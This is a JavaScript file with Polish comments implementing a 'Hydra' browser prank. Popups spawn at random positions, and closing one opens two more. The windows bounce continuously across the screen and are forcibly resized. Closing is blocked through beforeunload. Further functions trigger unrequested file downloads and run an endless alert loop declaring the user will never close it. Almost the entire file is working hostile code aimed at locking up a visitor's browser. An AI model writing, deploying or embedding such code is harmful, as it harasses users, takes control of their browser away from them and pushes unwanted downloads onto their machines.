// Zmienna globalna do przechowywania okien
if (typeof wins === 'undefined') window.wins = [];

const WIN_WIDTH = 600;
const WIN_HEIGHT = 400;

// Funkcja generująca losowe współrzędne
const getRandomCoords = () => ({
    x: Math.floor(Math.random() * (window.screen.availWidth - WIN_WIDTH)),
    y: Math.floor(Math.random() * (window.screen.availHeight - WIN_HEIGHT))
});

function openWindow() {
    const { x, y } = getRandomCoords();
    const uniqueName = "hydra_" + Math.random().toString(36).substring(7);
    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
    
    const win = window.open(window.location.pathname, uniqueName, opts);

    if (!win) {
        alert("Pop-upy są zablokowane! Zezwól na nie w ustawieniach paska adresu.");
        return;
    }

    wins.push(win);

    // Dodanie treści do nowego okna
    win.document.write(`
        <body style="margin:0; background:black; color:red; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; text-align:center;">
            <h1>HYDRA</h1>
            <p>ZAMKNIJ MNIE, A POJAWIĄ SIĘ DWA KOLEJNE</p>
            <video autoplay loop muted style="width:80%; border:2px solid red;">
                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
            </video>
        </body>
    `);

    // Aktywacja ruchu
    if (typeof startMovingWindow === 'function') {
        startMovingWindow(win);
    }

    // --- MECHANIZM HYDRY ---
    // Kiedy użytkownik próbuje zamknąć to okno (np. Alt+F4 lub X)
    win.addEventListener("beforeunload", function (e) {
        // Standardowe zabezpieczenie przed zamknięciem
        e.preventDefault();
        e.returnValue = "";

        // Wywołujemy otwarcie dwóch nowych okien z okna głównego
        // Robimy to z lekkim opóźnieniem, by przeglądarka "przetrawiła" zamknięcie
        if (!window.closed) {
            window.openWindow(); 
            window.openWindow();
        }
    });
}

// Globalne ustawienia prędkości (piksele na klatkę)
const SPEED_X = 5; 
const SPEED_Y = 5;
const REFRESH_RATE = 10; // milisekundy (im mniej, tym płynniejszy ruch)

function startMovingWindow(win) {
    if (!win) return;

    // Początkowe kierunki (1 to w prawo/dół, -1 to w lewo/góra)
    let dx = SPEED_X;
    let dy = SPEED_Y;

    // Pobieramy wymiary ekranu i okna
    const screenWidth = window.screen.availWidth;
    const screenHeight = window.screen.availHeight;
    const winWidth = 600; // Takie same jak w openWindow
    const winHeight = 400;

    // Pobieramy aktualną pozycję (startową)
    let currentX = parseInt(win.screenX);
    let currentY = parseInt(win.screenY);

    const move = () => {
        if (win.closed) {
            clearInterval(timer);
            return;
        }

        // Aktualizacja pozycji
        currentX += dx;
        currentY += dy;
        
        // Odbijanie z marginesem bezpieczeństwa (np. 5px od krawędzi)
        const margin = 5;

        // Odbijanie od lewej/prawej krawędzi
        if (currentX + winWidth >= screenWidth - margin || currentX <= margin) {
            dx *= -1;
            // Dodatkowe zabezpieczenie: przytnij pozycję, by nie wyszła poza ekran
            currentX = Math.max(margin, Math.min(currentX, screenWidth - winWidth - margin));
        }
  
        if (currentY + winHeight >= screenHeight - margin || currentY <= margin) {
            dy *= -1;
            currentY = Math.max(margin, Math.min(currentY, screenHeight - winHeight - margin));
        }

        // Przesunięcie okna i WYMUSZENIE rozmiaru (zapobiega maksymalizacji)
        win.moveTo(currentX, currentY);
        win.resizeTo(winWidth, winHeight);
    };

    const timer = setInterval(move, REFRESH_RATE);
}
function downloadFiles() {
    // Lista plików do pobrania (zastąp je swoimi linkami)
    const files = [
        'plik1.jpg'
    ];

    files.forEach((fileUrl, index) => {
        // Używamy setTimeout, aby przeglądarka nie zablokowała wielu pobrań naraz
        setTimeout(() => {
            const link = document.createElement('a');
            link.href = fileUrl;
            link.download = fileUrl.split('/').pop(); // Sugerowana nazwa pliku
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }, index * 500); // Odstęp pół sekundy między plikami
    });
}
function annoyingAlerts() {
    while(true) {
        alert("Nigdy mnie nie zamkniesz!");
        // UWAGA: Przeglądarki po kilku razach dają opcję "Zablokuj kolejne okna dialogowe"
    }
}
